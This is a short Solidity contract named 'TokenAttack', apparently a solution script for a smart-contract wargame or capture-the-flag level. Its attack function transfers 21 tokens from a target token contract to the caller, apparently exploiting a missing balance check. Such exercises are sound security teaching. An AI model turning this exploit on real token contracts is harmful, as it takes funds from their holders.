// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract TokenAttack is Broadcasted {
    function attack(address payable tokenCtr_) public payable override {
        IToken(tokenCtr_).transfer(msg.sender, 21);
    }
}

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}
